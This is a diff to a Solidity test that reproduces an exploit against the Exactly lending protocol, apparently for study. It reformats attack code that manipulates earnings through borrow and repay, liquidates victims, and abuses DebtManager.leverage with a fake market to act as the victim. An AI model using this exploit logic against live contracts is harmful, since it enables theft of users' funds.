@@ -196,16 +196,16 @@ contract ContractTest is Test {
         for (uint256 i; i < 6; ++i) {
             (uint256 sumCollateral, uint256 sumDebtPlusEffects) =
                 Auditor.accountLiquidity(address(victimList[0]), address(0), 0);
-            // In the attack transaction, only the top victim is checked to see if they meet the liquidation conditions. 
+            // In the attack transaction, only the top victim is checked to see if they meet the liquidation conditions.
             // By removing this check, more users can be made eligible for liquidation.
             // if (sumCollateral >= sumDebtPlusEffects) {
-                // @note https://github.com/exactly/protocol/blob/main/contracts/Market.sol#L917-L942
-                // the backupEarnings decrease
-                // @note https://github.com/exactly/protocol/blob/main/contracts/Market.sol#L930-L932
-                exaUSDC.borrowAtMaturity(
-                    maturityList[i], depositAmount / 2, type(uint256).max, address(this), address(this)
-                );
-                exaUSDC.repayAtMaturity(maturityList[i], type(uint256).max, type(uint256).max, address(this));
+            // @note https://github.com/exactly/protocol/blob/main/contracts/Market.sol#L917-L942
+            // the backupEarnings decrease
+            // @note https://github.com/exactly/protocol/blob/main/contracts/Market.sol#L930-L932
+            exaUSDC.borrowAtMaturity(
+                maturityList[i], depositAmount / 2, type(uint256).max, address(this), address(this)
+            );
+            exaUSDC.repayAtMaturity(maturityList[i], type(uint256).max, type(uint256).max, address(this));
             // } else {
             //     break;
             // }
@@ -226,7 +226,10 @@ contract ContractTest is Test {
 
         // *********************** liquidate *********************** //
         for (uint256 i; i < 8; ++i) {
-            try exaUSDC.liquidate(victimList[i], type(uint256).max, address(exaUSDC)) {} catch { continue; } // liquidate victim's position
+            try exaUSDC.liquidate(victimList[i], type(uint256).max, address(exaUSDC)) {}
+            catch {
+                continue;
+            } // liquidate victim's position
             fakeMarketList[i + 8].setVictim(victimList[i]);
             try DebtManager.leverage( // Manipulate the victim's position further after liquidation
                 address(fakeMarketList[i + 8]),
@@ -234,7 +237,9 @@ contract ContractTest is Test {
                 0,
                 0,
                 IDebtManager.Permit({account: address(victimList[i]), deadline: 0, v: 0, r: bytes32(0), s: bytes32(0)})
-            ) {} catch { continue; } // set global _msgSender to victimList[i] in contract DebtManager, then invoke fakeMarketList[i].deposit() to trigger the function crossDelevage()
+            ) {} catch {
+                continue;
+            } // set global _msgSender to victimList[i] in contract DebtManager, then invoke fakeMarketList[i].deposit() to trigger the function crossDelevage()
         }
 
         emit log_named_decimal_uint(
@@ -376,7 +381,6 @@ contract FakeMarket is Nonces {
                 amount1Max: 340_282_366_920_938_463_463_374_607_431_768_211_455
             })
         );
-
     }
 
     struct Account {
